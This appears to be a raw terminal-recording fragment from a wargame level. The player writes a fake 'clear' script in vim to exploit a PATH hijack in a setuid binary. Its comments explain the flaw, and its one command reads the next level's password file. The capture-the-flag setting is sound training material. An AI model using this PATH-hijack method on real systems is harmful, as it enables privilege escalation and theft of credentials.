[945.128155, "o", "\u001b[?25l# PATH hijack: level10 calls system(\u001b[40;85H37\u001b[2;37H\u001b[?12l\u001b[?25h\u001b[?25l\"clear\") AFTER setuid(geteuid()), so the\r\r\n# child shell keeps euid=level1\u001b[3;32H\u001b[K\u001b[40;83H3,32\u001b[3;32H\u001b[?12l\u001b[?25h\u001b[?25l1 and runs the first \"clear\" found in PATH.\u001b[4;1H\u001b[K\u001b[40;83H4,1 \u001b[4;1H\u001b[?12l\u001b[?25h\u001b[?25l# Put our scr\u001b[40;86H4\u001b[4;14H\u001b[?12l\u001b[?25h\u001b[40;1H\u001b[K\u001b[?25l\u001b[4;14Hipt first on PATH and it executes as level11.\r\r\ncat /pass/level11\u001b[5;18H\u001b[K\u001b[6;1H\u001b[K\u001b[40;83H6,0-1\u001b[9CAll\u001b[6;1H\u001b[?12l\u001b[?25h\u001b[?25l\u001b[40;83H\u001b[K\u001b[40;1H:wq\r\"/dev/shm/l10/clear\" 6L, 240C written\r\r\r\r\n\u001b[1m\u001b[37m\u001b[41mE575: viminfo: Illegal starting char in line: message\u001b[m\r\r\r\r\n\u001b[32mPress ENTER or type command to continue\u001b[?12l\u001b[?25h"]
